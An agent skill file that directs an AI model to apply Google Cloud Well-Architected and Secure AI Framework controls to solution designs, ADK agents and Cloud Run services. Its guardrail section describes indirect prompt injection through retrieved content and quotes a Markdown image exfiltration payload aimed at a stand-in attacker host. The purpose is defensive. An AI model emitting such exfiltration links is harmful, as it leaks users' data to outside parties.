---
name: gcp-well-architected-saif
description: >-
  Enforces the Google Cloud Well-Architected Framework (WAF — 6 Core Principles, 6 Core Pillars:
  Operational Excellence, Security/Privacy/Compliance, Reliability, Cost Optimization, Performance
  Optimization, Sustainability, plus AI/ML and FSI Perspectives) and the Google Secure AI Framework
  (SAIF & SAIF 2.0 for Autonomous Agents — 6 Core Elements, 15 Standardized SAIF Risks, 6 Control
  Layers, and Hybrid Deterministic + Probabilistic Agent Guardrails) across all Solution Designs,
  System Architectures, Spec-Driven Development (SDD) specs, ADK agents, and Cloud Run deployments.
  Activate whenever creating, reviewing, or refining a Solution Design document, framing Phase 1
  Inception architecture, authoring Phase 2 SDD specifications, or auditing Phase 3 deployments.
  In case of any conflict with legacy rules or heuristics, Google Cloud WAF and Google SAIF take
  strict precedence.
---

# Google Cloud Well-Architected Framework (WAF) & Secure AI Framework (SAIF) Skill (`gcp-well-architected-saif`)

You are a Principal Google Cloud Enterprise Architect and AI Security Lead. Your mandate is to ensure that every **Solution Design**, **System Architecture**, **Feature Specification (`specs/features/SPEC-*.md`)**, **Google ADK Agent (`agent_runtime`)**, and **Cloud Run Service (`cloud_run`)** strictly adheres to two authoritative Google frameworks:

1. **Google Cloud Well-Architected Framework (WAF):** [`https://docs.cloud.google.com/architecture/framework`](https://docs.cloud.google.com/architecture/framework) (including the **AI & ML Perspective** and **Financial Services / FSI Perspective**).
2. **Google Secure AI Framework (SAIF & SAIF 2.0 for Autonomous Agents):** [`https://safety.google/intl/en/safety/saif/`](https://safety.google/intl/en/safety/saif/) and [`https://saif.google/`](https://saif.google/).

### AI-SDLC Master Hub & Governance Rules Wiring
- **Master Orchestrator Hub:** Wired into the **[`ai-sdlc` master skill (`../ai_sdlc/SKILL.md`)](../ai_sdlc/SKILL.md)** across **Phase 1 (Inception)**, **Phase 2 (SDD Execution)**, and **Phase 3 (Operation)**, and automatically chained inside `validate_sdlc_gate.py`. Can also be invoked **standalone** for independent Solution Design creation or architecture reviews.
- **Governed Rule Set (Rules 1–13):** Holds **Supreme Precedence** over all repository rules:
  - [`ai_sdlc_and_sdd_standards.md`](../../rules/ai_sdlc_and_sdd_standards.md) (*Lifecycle, SDD & Rule 13: 4-Step RCA + WAF Graceful Degradation*)
  - [`google_adk_and_agent_runtime.md`](../../rules/google_adk_and_agent_runtime.md) (*Rules 11–12: Google ADK, Cognitive Reasoning, SAIF 2.0 4-Point Guardrails & DLP-Safe Live Eval*)
  - [`devops_security_and_quality_standards.md`](../../rules/devops_security_and_quality_standards.md) (*Rules 1–10: Multi-Branch SCM, Static Quality, CodeMender SAST, SLSA/Binary Auth, Cloud Build, Cloud Run `/healthz` + SLOs, Unified `.env`/CMEK, Terraform/VPC-SC/FinOps/CFE, Zero-Trust IAM/Ingress*)

---

## 0. Supreme Precedence & Conflict-Resolution Mandate

> [!IMPORTANT]
> **Strict Precedence Rule:** Whenever any design assumption, template default, or legacy pattern conflicts with the **Google Cloud Well-Architected Framework (WAF)** or **Google Secure AI Framework (SAIF)**, **WAF and SAIF take absolute precedence**.

Specifically, enforce these five non-negotiable conflict resolutions across all Solution Designs and codebases:

1. **Zero Trust Ingress Over Unauthenticated Shortcuts (WAF Security Pillar 2 & SAIF Principle 1):**
   - **Prohibited Anti-Pattern:** Using Cloud Run Pattern 3 (`run.googleapis.com/invoker-iam-disabled = "true"` + `INGRESS_TRAFFIC_ALL`) for "friction-free internal web tools" or any workload invoking AI agents or accessing internal data.
   - **WAF + SAIF Mandate:** *"Never trust, always verify."* Every internal tool, enterprise portal, and AI assistant **MUST** authenticate the human controller before reaching application or agent tiers using **Pattern 1A (Global External Application Load Balancer + Cloud Armor WAF/DDoS + Identity-Aware Proxy [IAP] + `INGRESS_TRAFFIC_INTERNAL_LOAD_BALANCER` — default for Tier-1, external/B2B, multi-region & regulated workloads)**, **Pattern 1B (Direct Cloud Run IAP `--iap` + `INGRESS_TRAFFIC_ALL` + `--no-allow-unauthenticated` + backend `x-goog-iap-jwt-assertion` verification + documented ADR trade-off — permitted for internal workforce, single-region & cost-optimized/Non-Prod apps)**, or **Pattern 2 (App-Level OAuth 2.0 / OIDC + Cloud Armor + backend cryptographic ID token verification)**. Pattern 3 is restricted strictly to explicitly approved anonymous public static/marketing pages and is **forbidden** for internal or AI workloads.
2. **Least-Privilege Agent Identity, `User Auth` & Externalized Deterministic HITL (SAIF 2.0 & WAF Decoupling):**
   - **Prohibited Anti-Pattern:** Attaching database-mutating or financial tools directly to an LLM agent executing under a broad shared Service Account, gated only by a mutable `Session.state` flag inside the LLM context.
   - **WAF + SAIF Mandate:** Probabilistic LLM instructions alone cannot guarantee security against adaptive prompt injection. You **MUST**:
     - Partition subagents by blast radius: keep informational/RAG subagents on **strictly read-only IAM principals**.
     - Eliminate **Confused Deputy** attacks by propagating **End-User Identity (`User Auth` / down-scoped OAuth 2.0 tokens)** alongside attested **Agent Identity** so downstream APIs and RAG stores enforce per-user row/document ACLs.
     - Execute state-mutating, financial, or destructive actions (`RAC` — Rogue Actions) through **fine-grained deterministic microservices/tools** enforcing hard policy caps (e.g., dollar limits, rate limits) and **externalized, cryptographically verified Human-in-the-Loop (HITL) confirmation** outside the LLM's probabilistic context window, backed by idempotency keys.
3. **4-Point Inline AI Guardrails (Model Armor + Sensitive Data Protection) & Indirect Prompt Injection Defense (SAIF `PIJ`, `EDH`, `SDD`, `IMO`):**
   - **Prohibited Anti-Pattern:** Screening only the initial user prompt while trusting retrieved RAG chunks/tool payloads or allowing raw PII/PCI/PANs to flow into LLM context windows, context caches, `agentengine://` sessions, Cloud Logging, or live eval suites.
   - **WAF + SAIF Mandate:** Implement 4-point inline inspection across the ADK lifecycle:
     1. `before_agent_callback` / `before_model_callback`: **Model Armor** (prompt injection, jailbreak, CSAM, malicious URL screening) + **Sensitive Data Protection (Cloud DLP)** bidirectional de-identification/cryptographic tokenization of PII/PCI/PHI before prompt submission, context caching, or logging.
     2. `after_tool_callback`: **Model Armor** screening of all untrusted RAG chunks, uploaded documents, and external tool outputs for **Indirect Prompt Injection (`PIJ`)** before re-entering the reasoning context.
     3. `after_model_callback`: **Sensitive Data Protection** output scrubbing + strict URL/origin allowlisting to prevent zero-click Markdown image/link data exfiltration (`![leak](https://attacker.tld/...)`).
     4. **Safe Live Evaluations (`agents-cli eval`):** Run live agent evaluations against isolated, de-identified or synthetic-seeded Non-Prod environments (or DLP-masked read-only replicas) inside **VPC Service Controls (VPC-SC)** and **CMEK**—never exposing unmasked production customer PII/PANs.
4. **WAF Reliability Graceful Degradation Harmonized with Rule 13 (Zero Fake/Mockup Data):**
   - **Prohibited Anti-Pattern:** Either crashing with unhandled 500s on transient downstream faults OR returning fabricated mockup records (`{"id": "ITEM-123"}`) to mask outages.
   - **WAF + SAIF Mandate:** Implement true **Graceful Degradation** (circuit breakers, bounded timeouts, retries with exponential backoff + jitter, Vertex AI **Provisioned Throughput with automatic PayGo spillover**) that returns **transparent, structured degraded-mode responses** (e.g., serving cryptographically verified cached static policy with an explicit `as_of` timestamp or routing cleanly to a human fallback queue)—never synthetic fake data.
5. **Defense-in-Depth Infrastructure & Full 6-Pillar Coverage (VPC-SC, CMEK, SLSA, Version Pinning, Execution Budgets, FinOps & Sustainability):**
   - Enforce **VPC Service Controls (VPC-SC)** perimeters, **Private Service Connect**, **Cloud KMS (CMEK / Cloud HSM / Cloud EKM)**, **Binary Authorization + SLSA provenance**, **pinned foundation model versions** (zero floating aliases in production), **hard per-session execution budgets** (max agent turns, subagent depth, token/timeout ceilings against Denial of ML Service `DMS`), **FinOps Unit Economics**, and **WAF Pillar 6 (Sustainability — CFE% region selection & AI work-per-watt optimization)**.

---

## 1. Google Cloud Well-Architected Framework (WAF) Architecture Blueprint

> **Deep-Dive Reference:** Read [`references/waf_six_pillars_and_perspectives.md`](./references/waf_six_pillars_and_perspectives.md) for the complete sub-page catalog, Google Cloud service mappings, AI/ML & FSI perspective rules, and pillar checklists.

### 1.1 Overarching Core Design Principles
Every Solution Design must explicitly demonstrate adherence to the 6 foundational WAF principles:
1. **Design for Change:** Architect for small, frequent, reversible releases with fast feedback loops (optimizing DORA metrics: Deployment Frequency, Lead Time, Change Failure Rate, MTTR).
2. **Simplify Your Design & Use Fully Managed Services:** Prefer serverless, fully managed Google Cloud services (`Cloud Run`, `Vertex AI / Gemini Enterprise Agent Runtime`, `BigQuery`, `Cloud SQL / AlloyDB / Spanner`, `Pub/Sub`) over self-managed VMs/clusters unless hard workload constraints dictate otherwise.
3. **Decouple Your Architecture:** Enforce clean runtime and domain boundaries (Dual-Runtime split between `cloud_run` stateless UI/streaming proxy and `agent_runtime` cognitive orchestration; async Pub/Sub eventing for non-blocking side effects).
4. **Use a Stateless Architecture:** Externalize all session state (`agentengine://`, Memorystore, AlloyDB/Spanner/Firestore) so compute tiers scale horizontally to/from zero and survive restarts without data loss.
5. **Automate Everything:** Codify 100% of infrastructure (Terraform + Infrastructure Manager), CI/CD (Cloud Build), SAST (CodeMender), and policy guardrails as code.
6. **Document Your Architecture & Test Continuously:** Maintain living specs (`specs/`), architecture diagrams (`docs/`), Architecture Decision Records (ADRs), unit/property-based tests, live agent evals, and DR game days.

### 1.2 The Six (6) Official Core Pillars

| Pillar | Core WAF Mandate | Required Google Cloud Architectural Controls |
| :--- | :--- | :--- |
| **1. Operational Excellence** | Ensure operational readiness using CloudOps; automate change; manage incidents via SLOs & blameless postmortems; optimize resources; continuously improve. | - **SLIs, SLOs & Error Budgets** in Cloud Monitoring Service Monitoring with multi-window burn-rate alerts.<br>- **End-to-End Observability:** Structured JSON logs (`trace`, `spanId`, `session_id`) in Cloud Logging + OpenTelemetry spans in Cloud Trace.<br>- **Progressive Delivery:** Cloud Build CI/CD with canary revision traffic splitting and 1-command automated rollback. |
| **2. Security, Privacy, and Compliance** | Security by design; Zero Trust (*never trust, always verify*); Shift-left security; Preemptive cyber-defense; Secure & responsible AI (SAIF); Regulatory compliance; Shared Fate. | - **Edge & Identity:** Pattern 1A (Global External ALB + **Cloud Armor** + **IAP**), Pattern 1B (Direct Cloud Run **IAP** `--iap` + `x-goog-iap-jwt-assertion` JWT verification for internal workforce apps), or Pattern 2 (OAuth 2.0/OIDC + Cloud Armor). Dedicated least-privilege SAs; zero `allUsers`; `iam.disableServiceAccountKeyCreation`.<br>- **Perimeter & Crypto:** **VPC Service Controls (VPC-SC)** + **Private Service Connect**; **Cloud KMS (CMEK / HSM / EKM)** on all storage, BigQuery, Vertex AI, and logs.<br>- **Supply Chain & AI:** Pre-build **CodeMender** SAST, Artifact Analysis, **SLSA Level 3 + Binary Authorization**, **Model Armor** + **Sensitive Data Protection (DLP)**. |
| **3. Reliability** | Define reliability on user-experience goals; set realistic SLOs (<100%); eliminate SPOFs via redundancy; horizontal scalability; observability; graceful degradation; recovery testing. | - **Explicit Reliability Math:** Define composite SLA/SLO targets, **RTO**, and **RPO** per tier.<br>- **Redundancy & HA:** Multi-zone (or multi-region active-active) Cloud Run + BigQuery/Spanner/AlloyDB regional HA + cross-region DR replication.<br>- **Resilience Patterns:** Vertex AI **Provisioned Throughput with automatic PayGo spillover**; bounded timeouts, retries with exponential backoff + jitter, circuit breakers, and transparent degraded-mode fallbacks. |
| **4. Cost Optimization** | Align cloud spending with business value (FinOps lifecycle: *Inform $\rightarrow$ Optimize $\rightarrow$ Operate*); foster cost culture; optimize resource usage continuously. | - **FinOps & Unit Economics:** Track cost per business outcome (e.g., `$ / resolved case` or `$ / 1,000 agent turns`); enforce mandatory labels (`env`, `service`, `owner`, `cost_center`); enable BigQuery Billing Export + Budgets & Anomaly Alerts.<br>- **Right-Sizing & Commitments:** Cloud Run scale-to-zero in `nonprod`; BigQuery partitioning/clustering + `maximum_bytes_billed`; **Vertex AI Context Caching** (50%–90% token savings), **Model Routing** (Flash vs. Pro), **Batch API** (-50% for offline evals), and CUDs/Provisioned Throughput for steady baselines. |
| **5. Performance Optimization** | Plan resource allocation; leverage elasticity; promote modular design; continuously monitor & improve latency/throughput. | - **Latency & TTFT Targets:** Define p50/p95/p99 and Time-to-First-Token (TTFT) budgets.<br>- **Streaming & Caching:** End-to-end SSE/WebSocket token streaming (`X-Accel-Buffering: no`), **Vertex AI Context Caching**, Cloud CDN, Memorystore, and parallel `FunctionTool` fan-out.<br>- **Co-Location & Warmth:** Co-locate Cloud Run, Agent Engine, Model Armor, KMS, and data stores in the **same GCP region**; enable Startup CPU Boost + `min-instances` in `prod`. |
| **6. Sustainability** | Use low-carbon (`High CFE %`) regions; optimize AI/ML work-per-watt; optimize compute/storage lifecycles; measure carbon footprint continuously. | - **Low-Carbon Region Selection:** Use the Google Cloud Region Picker (`CFE %` / `Low CO2`) within data-residency and latency constraints.<br>- **Green AI & Storage Hygiene:** Tiered model routing (smallest viable model per step), Context Caching, scale-to-zero idle compute, BigQuery/Cloud Storage TTL lifecycle rules to purge dark data, and **Carbon Footprint export to BigQuery**. |

### 1.3 Cross-Pillar Perspectives (`AI & ML` and `Financial Services / FSI`)
- **AI and ML Perspective (`/architecture/framework/perspectives/ai-ml`):**
  - **Model Pinning & Routing:** Pin immutable model versions (`gemini-2.5-pro-001` / `gemini-2.5-flash-001`); route classification/extraction to Flash and complex multi-hop reasoning to Pro.
  - **Enterprise Grounding (RAG):** Ground responses in authoritative systems of record (`Vertex AI Search`, `Vertex AI Vector Search`, `BigQuery Vector Search`, `AlloyDB pgvector`) with document-level ACL enforcement and verifiable citations ($1.000$ groundedness).
  - **EvalOps & 3-Layer Drift Monitoring:** Automate `agents-cli eval` / Vertex AI Gen AI Evaluation in CI/CD and production sampling; monitor (1) Infrastructure SLIs (TTFT, `429`s, GSU saturation), (2) Retrieval/Embedding Drift, and (3) Behavioral/Quality Drift (groundedness, tool-loop retries, Model Armor block spikes).
- **Financial Services (FSI) Perspective (`/architecture/framework/perspectives/fsi`):**
  - **3-Layer FSI Defense-in-Depth Landing Zone:**
    - *Layer 1 (Sovereignty & Governance):* **Assured Workloads**, `constraints/gcp.resourceLocations`, **Access Transparency**, and **Access Approval** for regulatory compliance (PCI-DSS, SOX, GLBA, GDPR, EU DORA, CFPB Reg E/Z).
    - *Layer 2 (Zero-Trust Perimeter):* Shared VPC micro-segmentation + **VPC Service Controls (VPC-SC)** perimeters + Private Service Connect + Cloud Armor + IAP *(FSI regulated production requires Pattern 1A ALB + Cloud Armor + IAP)*.
    - *Layer 3 (Cryptographic Control & Immutable Audit):* **Cloud KMS (CMEK / Cloud HSM / Cloud EKM)** with separation of duties + locked immutable **Cloud Audit Logs** / compliance WORM retention buckets (`Bucket Lock`) + **Sensitive Data Protection (DLP)**.

### 1.4 Resolving Cross-Pillar Architectural Trade-Offs (Mandatory ADR Matrix)
In every Solution Design, explicitly document how cross-pillar tensions are balanced:
1. **Reliability vs. Cost:** Target pragmatic SLOs (`99.9%` regional multi-zone or `99.95%` multi-region for Tier-1) backed by Error Budgets and graceful degradation rather than chasing `100%`; reserve multi-region HA for `prod` while scaling `nonprod` to zero.
2. **Security/Compliance vs. Latency/Velocity & Edge Cost (`Pattern 1A` vs. `Pattern 1B`):** Co-locate KMS keys, Model Armor templates, Cloud Run, Agent Engine, and databases in the **same region** to keep inline security inspection under budget (`<100–200ms`); choose **Pattern 1A (ALB + Cloud Armor + IAP)** when L7 WAF, custom domains, or multi-region failover are required, or **Pattern 1B (Direct Cloud Run IAP)** when `$0` idle baseline & simplicity for single-region internal workforce tools outweigh Cloud Armor edge WAF (with compensating `x-goog-iap-jwt-assertion` verification and app-level rate caps).
3. **Performance vs. Cost (GenAI Capacity):** Size **Provisioned Throughput (GSUs)** for steady baseline traffic and configure **automatic PayGo spillover** for burst peaks; combine **Context Caching** and **Model Routing** as win-win levers that simultaneously cut latency (TTFT) and token cost.
4. **Sustainability vs. Data Sovereignty & Latency:** Treat regulatory data residency (`gcp.resourceLocations`) and user RTT latency SLOs as hard filter constraints first, then select the highest **CFE %** region within that compliant set.

---

## 2. Google Secure AI Framework (SAIF & SAIF 2.0) Security Blueprint

> **Deep-Dive Reference:** Read [`references/saif_risk_taxonomy_and_agent_controls.md`](./references/saif_risk_taxonomy_and_agent_controls.md) for the complete 15-Risk SAIF table (`google/saif-data`), 6 Control Layers, and concrete ADK callback code blueprints.

### 2.1 The 6 Core Elements of Google SAIF
Every AI Solution Design must map its security posture across all six SAIF Core Elements:
1. **Element 1 — Expand strong security foundations to the AI ecosystem:** VPC-SC perimeters, CMEK/Confidential Computing, least-privilege IAM, SLSA supply-chain provenance, and Binary Authorization across datasets, vector stores, models, and agent runtimes.
2. **Element 2 — Extend detection and response to bring AI into an organization's threat universe:** Stream structured prompt/response hashes, Model Armor verdicts, tool-call trajectories, and Security Command Center (SCC) **AI Protection** findings into Cloud Logging and Google SecOps (SIEM/SOAR) with dedicated AI incident response playbooks.
3. **Element 3 — Automate defenses to keep pace with existing and new threats:** Enforce automated inline runtime screening via **Model Armor** + **Sensitive Data Protection (DLP)**, automated pre-build SAST via **CodeMender**, and automated adversarial CI/CD evaluation gates (`agents-cli eval`).
4. **Element 4 — Harmonize platform-level controls to ensure consistent security across the organization:** Enforce org-wide paved roads—centralized Model Armor floor templates, shared VPC-SC perimeters, unified Secret Manager/KMS governance, and approved Vertex AI Model Garden / ADK templates.
5. **Element 5 — Adapt controls to adjust mitigations and create faster feedback loops for AI deployment:** Connect production telemetry, HITL overrides, and red-team findings into a continuous regression flywheel (atomic versioning of prompt + tool schema + model ID + golden eval dataset with 1-click rollback).
6. **Element 6 — Contextualize AI system risks in surrounding business processes:** Calibrate controls to downstream business blast radius—enforcing read-only retrieval principals, deterministic policy caps, user-scoped authorization (`User Auth`), and externalized HITL approval gates before high-impact mutations, plus privacy-compliant retention/erasure (crypto-shredding / redaction).

### 2.2 Complete 15 Official SAIF Risks Checklist (`saif.google` / `google/saif-data`)
Ensure the architecture mitigates all 15 standardized SAIF risks across the 4 lifecycle components (**Data**, **Infrastructure**, **Model**, **Application**):
- **Data Layer:** `DP` (Data Poisoning), `UTD` (Unauthorized Training Data), `EDH` (Excessive Data Handling).
- **Infrastructure Layer:** `MST` (Model Source Tampering), `MXF` (Model Exfiltration), `MDT` (Model Deployment Tampering), `DMS` (Denial of ML Service).
- **Model Layer:** `MRE` (Model Reverse Engineering), `IIC` (Insecure Integrated Component), `PIJ` (Prompt Injection — Direct & Indirect), `MEV` (Model Evasion), `SDD` (Sensitive Data Disclosure), `ISD` (Inferred Sensitive Data).
- **Application & Agent Layer:** `IMO` (Insecure Model Output), `RAC` (Rogue Actions — *Core Agentic Risk*).

### 2.3 SAIF 2.0 Mandatory Controls for Autonomous AI Agents
Grounded in *Google's Approach for Secure AI Agents*, enforce a **Hybrid Defense-in-Depth Architecture** pairing probabilistic model reasoning with **deterministic external runtime enforcement**:

```mermaid
flowchart LR
    User([Authenticated Human Controller]) -->|1. IAP / OAuth2 Token| Edge["ALB + Cloud Armor + IAP<br/>(or Direct Cloud Run IAP)"]
    Edge -->|2. Verified User Auth + Session| Proxy["Cloud Run Streaming Proxy"]
    Proxy -->|3. before_agent / before_model| InGuard["Model Armor + Cloud DLP<br/>(Direct PIJ Block + PII Tokenization)"]
    InGuard --> Agent["ADK Orchestrator & Subagents<br/>(Pinned Model + Step/Token Budget)"]
    Agent -->|4a. Read-Only Query + User Auth| RAG["RAG / DB (Row/Doc ACLs)"]
    RAG -->|4b. after_tool_callback| ToolGuard["Model Armor Indirect PIJ Scan"]
    ToolGuard --> Agent
    Agent -->|5a. Proposed Mutation| PolicyGate["Deterministic Policy & Cap Engine<br/>+ Externalized HITL Approval Gate"]
    User -.->|5b. Signed UI Confirmation| PolicyGate
    PolicyGate -->|5c. Idempotent Write| MutateAPI["Transactional Core API"]
    Agent -->|6. after_model_callback| OutGuard["Model Armor + DLP Scrub<br/>+ URL/Origin Allowlist"]
    OutGuard --> Proxy
```

1. **Principle 1 — Well-Defined Human Controllers:** Every agent session binds to a cryptographically authenticated human identity. Untrusted external inputs (RAG chunks, emails, web pages, tool outputs) **never** gain controller authority.
2. **Principle 2 — Carefully Limited Powers (Least Privilege & Anti-Confused-Deputy):**
   - Separate **Read-Only Knowledge/Retrieval Subagents** from **Action/Workflow Subagents**.
   - Propagate down-scoped **End-User OAuth 2.0 tokens (`User Auth`)** alongside **Attested Agent Identity** so vector stores and APIs enforce per-user ACLs.
   - Replace generic execution tools with **narrow, schema-validated deterministic tools** that enforce hard business invariants (e.g., max refund cap, account ownership match) in deterministic code outside the LLM.
   - Require **externalized HITL confirmation** (signed/confirmed by the human controller in the trusted UI/API layer outside the LLM context) before executing state-mutating or financial actions (`RAC`).
3. **Principle 3 — Observable Actions, Planning & Execution Budgets:**
   - Log every prompt hash, retrieved document ID/version, tool call trajectory, Model Armor verdict, and HITL decision to immutable Cloud Audit / Cloud Logging sinks (with PII tokenized via Cloud DLP).
   - Enforce hard per-session **execution budgets** (max agent turns, max subagent delegation depth, wall-clock timeout, and max token ceiling) to prevent runaway loops and Denial of ML Service (`DMS`).

---

## 3. Workflow: How to Apply This Skill Across Tasks & AI-SDLC Phases

### Scenario A: Creating or Reviewing a Standalone Solution Design Document (e.g., Task 2 Solution Design)
1. **Review Discovery Inputs & Constraints:** Extract all functional requirements (`FR-*`), non-functional requirements (`NFR-*`), constraints (`CONST-*`), and risks (`RISK-*`) from the Discovery Document.
2. **Clarify Any Open Architectural Decisions (`ask_question`):** If any design choice or unresolved discovery blocker requires stakeholder alignment, pause and ask via `ask_question` with `(Recommended)` WAF/SAIF-compliant options.
3. **Apply the 6 WAF Pillars + AI/ML & Industry Perspectives:**
   - Select managed Google Cloud services (`Cloud Run`, `Vertex AI / Gemini Enterprise Agent Runtime`, `BigQuery`, `AlloyDB / Cloud SQL / Spanner`, `Vertex AI Search / Vector Search`, `Pub/Sub`, `Cloud KMS`, `VPC-SC`, `Cloud Armor`, `IAP`, `Model Armor`, `Sensitive Data Protection`).
   - Document explicit **Reliability math** (composite availability SLA, RTO, RPO, multi-zone/multi-region failover, Provisioned Throughput + PayGo spillover, graceful degradation).
   - Document **Performance** (p50/p95/p99 latency waterfall, TTFT, Context Caching, co-located region) and **Cost Optimization / FinOps** (unit economics metric, model routing, storage lifecycles, CUDs).
   - Document **Sustainability** (region CFE %, AI work-per-watt optimization, Carbon Footprint tracking).
   - Include a **Cross-Pillar Trade-Off & ADR Table** explaining how competing pillars (e.g., Security/Compliance vs. Latency, Reliability vs. Cost) were balanced.
4. **Embed the SAIF & SAIF 2.0 Defense-in-Depth Architecture:**
   - Map all **6 SAIF Core Elements** and the **15 SAIF Risks (`DP`..`RAC`)** to concrete Google Cloud controls.
   - Detail the **4-point Model Armor + Cloud DLP callback pipeline** (`before_agent`, `before_model`, `after_tool` Indirect PIJ scan, `after_model` output/URL sanitization) and **SAIF 2.0 Agentic Controls** (`User Auth` propagation, read-only vs. deterministic action boundary, externalized HITL gate, execution budgets).
5. **Run the Automated WAF + SAIF Compliance Validator:**
   ```bash
   python3 _agents/skills/gcp_well_architected_saif/scripts/validate_waf_saif.py --target <path-to-solution-design-or-sdd.md>
   ```
   Fix any missing pillars, unmitigated SAIF risks, or flagged anti-patterns before presenting the deliverable.

### Scenario B: Integrated Execution Inside the 3-Phase `ai-sdlc` Workflow
- **Phase 1 (Inception — Step 1.3 & 1.4):** Frame the runtime topology (`cloud_run` for `Regular App`; `cloud_run` + `agent_runtime` for `AI Agent` / `Hybrid`), Zero-Trust IAM/Ingress (Pattern 1A ALB+Cloud Armor+IAP, Pattern 1B Direct Cloud Run IAP, or Pattern 2 OAuth2), VPC-SC/CMEK boundary, and *(if AI Agent/Hybrid)* ADK hierarchy + 4-point Model Armor/DLP hooks. Optionally generate `docs/waf-saif-review_<project>.md` using [`references/solution_design_compliance_template.md`](./references/solution_design_compliance_template.md).
- **Phase 2 (Execution / SDD — Step 2.1 & 2.2):** Populate Sections 2–8 (*Architecture, Security/SAIF, Resiliency, Observability/AgentOps, Performance/FinOps/Sustainability, ADRs & FMEA*) of `specs/features/SPEC-<YYYYMMDD>-<FEATURE>.md` (omitting `[AI-Agent Only]` blocks when `Workload Type: Regular App`), ensuring Section 9 tests cover WAF *(and SAIF 2.0)* invariants.
- **Phase 3 (Operation — Step 3.1 to 3.4):** Verify shift-left SAST (`codemender`), Artifact Analysis + Binary Authorization (`cloudbuild.yaml`), least-privilege Terraform + VPC-SC/CMEK (`terraform/`), `/healthz` + SLO burn-rate alerts, and live post-deploy checks.

---

## 4. Bundled Reference Documentation & Validator Script

- **[WAF 6 Pillars, AI/ML & FSI Perspectives Deep-Dive Reference](./references/waf_six_pillars_and_perspectives.md)**
- **[SAIF 6 Elements, 15 Risks Catalog & SAIF 2.0 Agentic Controls Reference](./references/saif_risk_taxonomy_and_agent_controls.md)**
- **[Solution Design & SDD WAF + SAIF Compliance Matrix Template](./references/solution_design_compliance_template.md)**
- **Workload-Aware WAF + SAIF Compliance Validator CLI (`--workload-type {auto,regular,agent,hybrid}`):**
  ```bash
  python3 _agents/skills/gcp_well_architected_saif/scripts/validate_waf_saif.py --target <file_or_dir> [--workload-type auto|regular|agent|hybrid]
  ```
